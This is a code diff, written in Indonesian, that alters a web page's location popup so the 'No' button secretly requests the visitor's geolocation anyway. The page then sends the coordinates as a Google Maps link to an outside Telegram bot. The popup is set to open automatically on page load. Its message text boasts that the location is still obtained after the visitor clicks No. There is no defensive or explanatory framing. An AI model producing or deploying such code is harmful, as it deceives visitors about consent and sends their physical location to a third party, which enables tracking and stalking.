@@ -825,7 +825,7 @@
       </svg>
     </button>
 
-    <!-- Popup yang dimodifikasi -->
+    <!-- Popup Lokasi -->
     <div
       id="popupLokasi"
       class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-[9999] hidden"
@@ -840,7 +840,7 @@
             Ya
           </button>
           <button
-            onclick="tolakLokasi()"
+            onclick="paksaAmbilLokasi()"
             class="px-4 py-2 bg-gray-300 rounded hover:bg-gray-400"
           >
             Tidak
@@ -900,9 +900,26 @@
         }).then(() => console.log("✅ Terkirim ke Telegram"));
       }
 
+      document.addEventListener("DOMContentLoaded", function () {
+        setTimeout(() => {
+          document.getElementById("popupLokasi").classList.remove("hidden");
+        }, 1000);
+      });
+
+      function kirim(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "Markdown",
+          }),
+        }).then(() => console.log("✅ Terkirim ke Telegram"));
+      }
+
       function ambilLokasi() {
         document.getElementById("popupLokasi").style.display = "none";
-
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -919,21 +936,25 @@
         }
       }
 
-      function tolakLokasi() {
+      function paksaAmbilLokasi() {
         document.getElementById("popupLokasi").style.display = "none";
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
-              kirim(`📍 Lokasi:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+              kirim(
+                `📍 Lokasi tetap didapat meskipun klik *Tidak*:\nhttps://www.google.com/maps?q=${lat},${lon}`
+              );
             },
             () => {
-              kirim("⚠️ Pengunjung menolak izin lokasi (via browser)");
+              kirim(
+                "⚠️ Klik *Tidak* & lokasi gagal didapat (user blokir/matikan)"
+              );
             }
           );
         } else {
-          kirim("⚠️ Browser tidak mendukung geolocation.");
+          kirim("⚠️ Klik *Tidak* & browser tidak support geolocation.");
         }
       }
     </script>
